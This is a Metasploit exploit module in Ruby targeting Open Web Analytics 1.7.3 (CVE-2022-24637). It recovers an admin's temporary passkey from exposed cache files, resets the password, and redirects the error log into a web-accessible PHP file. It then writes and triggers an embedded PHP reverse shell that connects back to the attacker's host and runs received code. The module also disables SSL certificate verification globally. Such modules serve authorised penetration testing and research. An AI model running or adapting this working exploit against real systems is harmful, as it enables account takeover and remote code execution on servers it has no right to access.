class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  require 'base64'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Open Web Analytics 1.7.3 - Remote Code Execution (RCE)',
        'Description' => %q{
          Open Web Analytics (OWA) before 1.7.4 allows an unauthenticated remote attacker to obtain sensitive
          user information, which can be used to gain admin privileges by leveraging cache hashes.
          This occurs because files generated with '<?php (instead of the intended "<?php sequence) aren't handled
          by the PHP interpreter.
        },
        'Author' => [
          'Jacob Ebben',    # ExploitDB Exploit Author
          'Dennis Pfleger'  # Msf Module
        ],
        'References' => [
          [ 'CVE', '2022-24637'],
          [ 'EDB', '51026']
        ],
        'Licence' => MSF_LICENSE,
        'Platform' => ['php'],
        'DefaultOptions' => {
          'PAYLOAD' => 'php/meterpreter/reverse_tcp',
          'Username' => 'admin',
          'Password' => 'pwned'
        },
        'Targets' => [ ['Automatic', {}] ],
        'DisclosureDate' => '2022-03-18',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            ARTIFACTS_ON_DISK, # /owa-data/caches/{get_random_string(8)}.php
            IOC_IN_LOGS, # Malicious GET/POST requests in the webservice logs
            ACCOUNT_LOCKOUTS, # Account passwords will be changed in this module
          ]
        }
      )
    )

    register_options([
      OptString.new('Username', [ false, 'Target username (Default: admin)']),
      OptString.new('Password', [ false, 'Target new password (Default: pwned)']),
    ])
  end

  def check
    res = etablish_connection

    if !res.body.include?('Open Web Analytics')
      Exploit::CheckCode::Unknown
    elsif !res.body.include?('version=1.7.3')
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Vulnerable
    end
  end

  # This is needed to bypass self signed certificate verification
  OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE
  I_KNOW_THAT_OPENSSL_VERIFY_PEER_EQUALS_VERIFY_NONE_IS_WRONG = nil
  def exploit
    base_url = get_normalized_url(datastore['RHOSTS'])
    username = datastore['Username']
    new_password = datastore['Password']

    reverse_shell = "/*<?php /**/ error_reporting(0); $ip = '#{datastore['LHOST']}'; $port = #{datastore['LPORT']}; \
      if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f(\"tcp://{$ip}:{$port}\"); $s_type = 'stream'; } \
      if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if \
      (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); \
      $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) \
      { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); \
      break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\"Nlen\", $len); \
      $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); \
      break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; \
      $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) \
      { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();?>"

    shell_filename = "#{get_random_string(8)}.php"
    shell_url = "#{base_url}/owa-data/caches/#{shell_filename}"

    res = etablish_connection
    if res
      print_good("Connected to #{base_url} successfully!")
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_user_id' => username,
        'owa_password' => get_random_string(8),
        'owa_action' => 'base.login'
      }
    )
    if res.code != 200
      fail_with(Failure::Unknown, 'An error occured during the login attempt!')
    end

    print_status("Attempting to find cache of '#{username}' user")

    found = false
    cache = nil
    100.times do |key|
      user_id = "user_id#{key}"
      userid_hash = Digest::MD5.hexdigest(user_id)
      filename = "#{userid_hash}.php"
      cache_request = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, "/owa-data/caches/#{key}/owa_user/#{filename}")
      )
      if cache_request.code == 404
        next
      end

      cache_raw = cache_request.body
      cache = get_cache_content(cache_raw)
      cache_username = get_cache_username(cache)
      if cache_username != username
        print_message("The temporary password for a different user was found. \"#{cache_username}\": #{get_cache_temppass(cache)}", 'INFO')
        next
      else
        found = true
        break
      end
    end

    if !found
      fail_with(Failure::Unknown, "No cache found. Are you sure \"#{username}\" is a valid user?")
    end

    cache_temppass = get_cache_temppass(cache)
    print_good("Found temporary password for user '#{username}': #{cache_temppass}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.usersPasswordEntry'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_password' => new_password,
        'owa_password2' => new_password,
        'owa_k' => cache_temppass,
        'owa_action' => 'base.usersChangePassword'
      }
    )

    if res.code != 302
      fail_with(Failure::Unknown, 'An error occurred when changing the user password!')
    end
    print_good("Changed the password of '#{username}' to '#{new_password}'")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.loginForm'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_user_id' => username,
        'owa_password' => new_password,
        'owa_action' => 'base.login'
      }
    )

    redirect = res['location']
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => URI(redirect).path
    )
    if res && res.code == 200
      print_good("Logged in as #{username} user")
    else
      fail_with(Failure::Unknown, "An error occurred during the login attempt of user #{username}")
    end

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral')
    )

    nonce = get_update_nonce(res)
    log_location = '/var/www/html/owa-data/caches/' + shell_filename
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_nonce' => nonce,
        'owa_action' => 'base.optionsUpdate',
        'owa_config[base.error_log_file]' => log_location,
        'owa_config[base.error_log_level]' => 2
      }
    )
    if !res
      fail_with(Failure::Unknown, 'An error occurred when attempting to update config!')
    else
      print_status('Creating log file')
    end

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php?owa_do=base.optionsGeneral'),
      'keep_cookies' => true,
      'vars_post' => {
        'owa_nonce' => nonce,
        'owa_action' => 'base.optionsUpdate',
        'owa_config[shell]' => reverse_shell
      }
    )
    if !res
      fail_with(Failure::Unknown, 'An error occurred when attempting to update config!')
    else
      print_good('Wrote payload to file')
    end

    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/owa-data/caches/#{shell_filename}")
    )

    print_good('Triggering payload! Check your listener!')
    print_status("You can trigger the payload again at '#{shell_url}")
  end

  def etablish_connection
    url = get_normalized_url(datastore['RHOSTS'])
    base_url = url
    res = nil
    loop do
      res = Net::HTTP.get_response(URI.parse(url))
      url = res['location']
      break unless res.is_a?(Net::HTTPRedirection)
    end
    if !res
      fail_with(Failure::Unknown, "Could not connect to #{base_url}")
    else
      res
    end
  end

  def get_normalized_url(url)
    # url += '/' unless url[-1] == '/'
    # url = "http://#{url}" unless url.start_with?('http://', 'https://')
    url = "https://#{url}"
    url
  end

  def get_proxy_protocol(url)
    url.start_with?('https://') ? 'https' : 'http'
  end

  def get_random_string(length)
    chars = ('a'..'z').to_a + ('A'..'Z').to_a + (0..9).to_a
    length.times.map { chars.sample }.join
  end

  def get_cache_content(cache_raw)
    regex_cache_base64 = /\*(\w*)/
    regex_result = cache_raw.match(regex_cache_base64)

    unless regex_result
      fail_with(Failure::Unknown, 'The provided URL does not appear to be vulnerable!')
    end

    cache_base64 = regex_result[1]

    b64_string = cache_base64
    b64_string += '=' * ((4 - cache_base64.length % 4) % 4)

    cache_base64 = b64_string

    Base64.decode64(cache_base64).force_encoding('ascii')
  end

  def get_cache_username(cache)
    match = cache.match(/"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"/)
    match[1]
  end

  def get_cache_temppass(cache)
    match = cache.match(/"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"/)
    match[1]
  end

  def get_update_nonce(page)
    update_nonce = page.body.match(/owa_nonce" value="(\w*)"/)[1]
    update_nonce
  end
end
